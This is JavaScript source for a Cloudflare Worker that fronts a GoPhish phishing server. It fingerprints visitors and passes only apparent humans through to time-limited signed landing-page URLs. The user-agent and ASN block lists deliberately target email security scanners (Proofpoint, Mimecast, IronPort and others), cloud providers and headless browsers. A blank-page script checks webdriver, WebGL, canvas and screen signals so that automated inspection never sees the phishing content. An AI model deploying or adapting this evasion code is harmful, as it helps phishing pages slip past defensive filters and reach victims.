/*
 * gophish-redirector — Cloudflare Worker
 *
 * Sits in front of the GoPhish phishing server. Two-layer bot defense:
 *   Layer 1: cheap request-time heuristics (UA, ASN, Sec-Fetch, etc.)
 *   Layer 2: invisible JS challenge page that runs in the real browser
 *            and checks navigator.webdriver / plugins / WebGL renderer /
 *            screen / hardware concurrency before allowing the redirect.
 *
 * Authentication to GoPhish is via a time-bound signed URL. The Worker
 * appends id, exp (unix expiry = now + 60s), and sig = HMAC-SHA256(secret,
 * id + "." + exp) to every URL it sends to GoPhish. GoPhish recomputes the
 * signature and serves the landing page only while now < exp; once the
 * window passes it bounces the visitor back here for re-verification.
 * There is no per-rid burn — only the short-lived signed URL expires.
 *
 * Endpoints:
 *   /<anything>/hi?id=<rid>   → tracking pixel. Worker fires a
 *                               server-side GET to GoPhish's /hi to log
 *                               the open event, then returns 204 to the
 *                               mail client. No bot check, no JS.
 *   /<anything>?id=<rid>      → click. Layer-1 check first. If pass,
 *                               serve a blank HTML page with embedded JS
 *                               that performs the layer-2 fingerprint
 *                               check and POSTs back to /__verify.
 *   /__verify?id=<rid>        → JS-challenge submission. Validates
 *                               signals, returns {target} JSON on pass.
 *
 * Any request without a valid ?id=, and any request from a detected bot,
 * is 302-redirected to PHISH_ORIGIN/404 (which GoPhish in turn sends to
 * its configured not_found_redirect_url).
 *
 * Env vars (configure in Cloudflare dashboard → Workers → Settings → Variables):
 *   SECRET            64-char hex string. Must match
 *                     phish_server.redirector.secret in GoPhish config.json.
 *   PHISH_ORIGIN      e.g. https://phish.example.com (no trailing slash needed)
 */

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const origin = (env.PHISH_ORIGIN || '').replace(/\/+$/, '');
    const rid = url.searchParams.get('id');
    if (!rid) return notFound(origin);

    const key = await importHmacKey(env.SECRET);

    // /hi tracking pixel — Worker fires a server-side GET, returns 204.
    if (/\/hi$/.test(url.pathname)) {
      const target = `${origin}${url.pathname}?${await signedParams(rid, key)}`;
      ctx.waitUntil(fetch(target, { method: 'GET' }).catch(() => {}));
      return new Response(null, {
        status: 204,
        headers: { 'Cache-Control': 'no-store' },
      });
    }

    // JS challenge submission endpoint.
    if (url.pathname === '/__verify') {
      return handleVerify(request, rid, key, origin, ctx);
    }

    // Click path — layer-1 heuristic check.
    const verdict = classify(request);
    if (verdict.bot) {
      await fireBeep(rid, key, origin, ctx);
      return notFound(origin);
    }

    // Layer 2 — serve the JS challenge as a visually blank HTML page.
    return new Response(challengeHTML(rid), {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Referrer-Policy': 'no-referrer',
        'X-Robots-Tag': 'noindex, nofollow',
      },
    });
  },
};

// ─────────────────────────────────────────────────────────────────────
// /__verify — JS challenge submission handler
// ─────────────────────────────────────────────────────────────────────

async function handleVerify(request, rid, key, origin, ctx) {
  if (request.method !== 'POST') {
    return new Response(null, { status: 405 });
  }

  // On any failure the response carries target = PHISH_ORIGIN/404, so the
  // challenge page's location.replace(target) sends the bot there — the
  // same destination as a no-id visit.
  const reject = () => jsonResponse({ target: `${origin}/404` }, 200);

  // Re-apply the cheap heuristic. A bot could POST directly to /__verify
  // bypassing the GET-challenge step; this catches that.
  const verdict = classify(request);
  if (verdict.bot) {
    await fireBeep(rid, key, origin, ctx);
    return reject();
  }

  let body;
  try {
    body = await request.json();
  } catch (e) {
    return reject();
  }

  if (!signalsLookHuman(body && body.signals)) {
    await fireBeep(rid, key, origin, ctx);
    return reject();
  }

  // Pass — mint the time-bound signed target URL on the original path.
  const path = sanitizePath(body && body.path);
  const target = `${origin}${path}?${await signedParams(rid, key)}`;
  return jsonResponse({ target }, 200);
}

// sanitizePath restricts the path the JS can ask the Worker to redirect
// to. Must start with /, must not contain "//" (which would be a host
// override in some parsers), must not contain "?" or "#".
function sanitizePath(p) {
  if (typeof p !== 'string' || p.length === 0) return '/';
  if (p[0] !== '/') return '/';
  if (p.indexOf('//') !== -1) return '/';
  if (p.indexOf('?') !== -1 || p.indexOf('#') !== -1) return '/';
  return p;
}

// ─────────────────────────────────────────────────────────────────────
// Time-bound signed URL
// ─────────────────────────────────────────────────────────────────────

// TTL for a signed URL, in seconds. GoPhish serves the landing page only
// while now < exp; after that it bounces back here for re-verification.
const TOKEN_TTL_SECONDS = 60;

async function importHmacKey(hexSecret) {
  return crypto.subtle.importKey(
    'raw',
    hexToBytes(hexSecret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
}

// signedParams returns the query string "id=<rid>&exp=<unix>&sig=<hex>"
// where sig = HMAC-SHA256(secret, rid + "." + exp). The "." delimiter must
// match the gophish side exactly.
async function signedParams(rid, key) {
  const exp = Math.floor(Date.now() / 1000) + TOKEN_TTL_SECONDS;
  const sigBuf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(rid + '.' + exp));
  const sig = toHex(new Uint8Array(sigBuf));
  return `id=${encodeURIComponent(rid)}&exp=${exp}&sig=${sig}`;
}

async function fireBeep(rid, key, origin, ctx) {
  const beepTarget = `${origin}/beep?${await signedParams(rid, key)}`;
  ctx.waitUntil(fetch(beepTarget, { method: 'GET' }).catch(() => {}));
}

// ─────────────────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────────────────

function hexToBytes(hex) {
  const clean = (hex || '').trim();
  const out = new Uint8Array(clean.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(clean.substr(i * 2, 2), 16);
  }
  return out;
}

function toHex(bytes) {
  return [...bytes].map(b => b.toString(16).padStart(2, '0')).join('');
}

function jsonResponse(obj, status) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
    },
  });
}

// notFound 302-redirects to PHISH_ORIGIN/404. Used for any request without
// a valid ?id= and for detected bots. GoPhish has no /404 route, so the
// catch-all rejects it (no valid signature) and forwards to its configured
// not_found_redirect_url.
function notFound(origin) {
  return new Response(null, {
    status: 302,
    headers: { 'Location': `${origin}/404`, 'Cache-Control': 'no-store' },
  });
}

// ─────────────────────────────────────────────────────────────────────
// Layer 1 — cheap request-time bot classification
// ─────────────────────────────────────────────────────────────────────

function classify(request) {
  const cf = request.cf || {};
  const ua = request.headers.get('user-agent') || '';

  if (BOT_UA_RE.test(ua) || !ua) return { bot: true, reason: 'ua' };
  if (BLOCKED_ASNS.has(cf.asn)) return { bot: true, reason: 'asn' };
  if (cf.botManagement && cf.botManagement.verifiedBot) return { bot: true, reason: 'verifiedBot' };
  if (!request.headers.get('sec-fetch-mode')) return { bot: true, reason: 'sec-fetch' };
  if (!request.headers.get('sec-fetch-site')) return { bot: true, reason: 'sec-fetch' };
  if (!request.headers.get('accept-language')) return { bot: true, reason: 'accept-language' };

  return { bot: false };
}

const BOT_UA_RE = new RegExp([
  'bot', 'spider', 'crawl',
  'curl', 'wget', 'python-requests', 'python-urllib', 'python/',
  'go-http-client', 'okhttp', 'java/',
  'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
  'scrapy', 'httrack',
  'monitis', 'pingdom', 'uptime',
  'slackbot', 'discordbot', 'whatsapp', 'telegrambot',
  'facebookexternalhit', 'twitterbot', 'linkedinbot',
  'proofpoint', 'mimecast', 'barracuda', 'symantec', 'messagelabs',
  'sophos', 'fortinet', 'paloalto', 'cisco', 'ironport',
  'msnbot', 'bingbot', 'googlebot', 'yandex', 'duckduckbot',
].join('|'), 'i');

const BLOCKED_ASNS = new Set([
  15169, 8075, 16509, 14618, 13335, 16276, 14061, 20473, 24940, 63949, 396982,
  26211, 22843, 14637, 21948, 8987,
]);

// ─────────────────────────────────────────────────────────────────────
// Layer 2 — JS-challenge signal evaluation
// ─────────────────────────────────────────────────────────────────────

function signalsLookHuman(s) {
  if (!s || typeof s !== 'object') return false;

  // navigator.webdriver === true → Selenium / Puppeteer / Playwright
  // defaults. Almost always a bot.
  if (s.wd === true) return false;

  // navigator.languages empty → headless / scripted environment.
  if (!s.lc || s.lc === 0) return false;

  // hardwareConcurrency === 0 → headless with reporting disabled.
  if (!s.hc || s.hc === 0) return false;

  // Screen size 0 → headless without a viewport.
  if (!s.sw || !s.sh) return false;

  // Software / fallback WebGL renderers strongly indicate headless.
  if (s.wg && /SwiftShader|llvmpipe|Mesa|Microsoft Basic Render/i.test(s.wg)) {
    return false;
  }

  // Canvas didn't produce anything → API stubbed or broken.
  if (!s.cn || typeof s.cn !== 'string' || s.cn.length < 8) return false;

  return true;
}

// ─────────────────────────────────────────────────────────────────────
// Layer 2 — challenge HTML/JS payload (visually blank)
// ─────────────────────────────────────────────────────────────────────

function challengeHTML(rid) {
  // The page is deliberately empty visually. The script runs immediately,
  // collects signals, POSTs to /__verify, and navigates to the returned
  // target on pass. On any error / fail, the page stays blank.
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><title></title>` +
    `<meta name="robots" content="noindex,nofollow"></head><body><script>` +
    `(async function(){try{` +
      `var c=document.createElement('canvas'),x=c.getContext('2d'),cn='';` +
      `if(x){x.textBaseline='top';x.font='14px Arial';x.fillStyle='#069';x.fillText('h',2,2);` +
        `try{cn=c.toDataURL().slice(-32);}catch(e){}}` +
      `var wg='';try{var gc=document.createElement('canvas');` +
        `var gl=gc.getContext('webgl')||gc.getContext('experimental-webgl');` +
        `if(gl){var ext=gl.getExtension('WEBGL_debug_renderer_info');` +
        `if(ext)wg=String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||'');}}catch(e){}` +
      `var s={` +
        `wd:navigator.webdriver===true,` +
        `pl:(navigator.plugins&&navigator.plugins.length)||0,` +
        `lc:(navigator.languages&&navigator.languages.length)||0,` +
        `hc:navigator.hardwareConcurrency||0,` +
        `dm:navigator.deviceMemory||0,` +
        `tp:navigator.maxTouchPoints||0,` +
        `sw:(window.screen&&window.screen.width)||0,` +
        `sh:(window.screen&&window.screen.height)||0,` +
        `cn:cn,` +
        `wg:wg` +
      `};` +
      `var r=await fetch('/__verify?id='+encodeURIComponent(${JSON.stringify(rid)}),{` +
        `method:'POST',headers:{'Content-Type':'application/json'},` +
        `body:JSON.stringify({signals:s,path:window.location.pathname})` +
      `});` +
      `if(r.ok){var d=await r.json();if(d&&d.target){location.replace(d.target);}}` +
    `}catch(e){}})();` +
    `</script></body></html>`;
}
